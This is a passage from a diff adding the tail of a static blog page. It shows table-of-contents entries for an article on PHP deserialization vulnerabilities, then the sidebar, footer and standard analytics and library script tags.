href="#%E7%BB%95%E8%BF%87-wakeup-%E6%96%B9%E6%B3%95"><span class="toc-text">绕过__wakeup()方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="toc-text">反序列化漏洞案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">防御PHP反序列化漏洞</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#command"
+                           title="command">command</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.zerochen.top">墨的博客</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.sunflowers.vip">sunflowers的博客</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/mar-mot">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; marmot 2021
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/blog.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.marmot.vip/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="/img/marmot.jpg">
+</body>
+
+</html>
